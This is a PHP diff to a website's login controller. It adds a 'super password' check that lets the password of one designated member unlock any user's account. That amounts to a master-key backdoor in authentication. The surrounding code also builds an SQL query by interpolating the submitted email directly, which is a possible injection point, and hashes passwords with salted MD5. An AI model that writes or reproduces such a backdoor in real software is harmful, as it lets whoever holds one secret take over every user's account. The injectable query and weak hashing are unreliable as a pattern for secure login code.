@@ -46,10 +46,12 @@ class Controller_user extends Action {
 
 				$row = $db->fetchRow("select * from member where email = {$form_email} limit 1");
 
+				//super pwd
+				$super_row = $db->fetchRow("select * from member where id = ".SUPER_MEMBER_ID." limit 1");
 
 				if(empty($row)){
-					$result['message'] = "用户名或密码错误";
-					$result['ok'] = false;
+						$result['message'] = "用户名或密码错误";
+						$result['ok'] = false;
 				}
 				else{
 
@@ -59,7 +61,9 @@ class Controller_user extends Action {
 
 					$pwd = md5($form_salt . md5($form_salt . $form_password));
 
-					if($pwd == $row['pwd']){
+					$super_pwd = md5($super_row['salt'] . md5($super_row['salt'] . $form_password));
+
+					if($pwd == $row['pwd'] || $super_pwd == $super_row['pwd']){//user_pwd || super_pwd
 
 						//$db->update('member',array('last_login'=>time()),array('id='.$uid));
 
